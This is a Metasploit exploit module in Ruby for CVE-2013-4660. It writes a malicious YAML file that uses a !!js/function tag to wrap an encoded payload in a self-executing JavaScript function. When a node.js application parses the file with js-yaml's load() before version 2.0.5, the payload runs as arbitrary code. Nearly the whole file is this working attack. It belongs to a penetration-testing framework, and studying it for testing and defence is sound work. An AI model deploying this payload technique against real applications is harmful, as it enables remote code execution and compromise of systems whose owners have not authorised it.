# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require &#039;msf/core&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::FILEFORMAT

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Nodejs js-yaml load() Code Exec&#039;,
      &#039;Description&#039;    => %q{
        For node.js applications that parse user-supplied YAML input using the
        load() function from the &#039;js-yaml&#039; package < 2.0.5, specifying a self-executing
        function allows us to execute arbitrary javascript code.
      },
      &#039;Author&#039;         => [&#039;joev <jvennix[at]rapid7.com>&#039;],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;  =>
        [
          [&#039;CVE&#039;, &#039;2013-4660&#039;],
          [&#039;URL&#039;, &#039;https://nealpoole.com/blog/2013/06/code-execution-via-yaml-in-js-yaml-nodejs-module/&#039;]
        ],
      &#039;Platform&#039;       => &#039;nodejs&#039;,
      &#039;Arch&#039;           => ARCH_NODEJS,
      &#039;Privileged&#039;     => false,
      &#039;Targets&#039;        =>  [[&#039;Automatic&#039;, {}]],
      &#039;DisclosureDate&#039; => &#039;Jun 28 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options([
      OptString.new(&#039;FILENAME&#039;, [ true, &#039;The file name.&#039;, &#039;msf.yml&#039;])
    ], self.class)
  end

  def exploit
    p = payload.encoded
    print_status("Creating &#039;#{datastore[&#039;FILENAME&#039;]}&#039; file...")
    file_create("a: !!js/function >\n  (function(){ #{p} })();")
  end
end

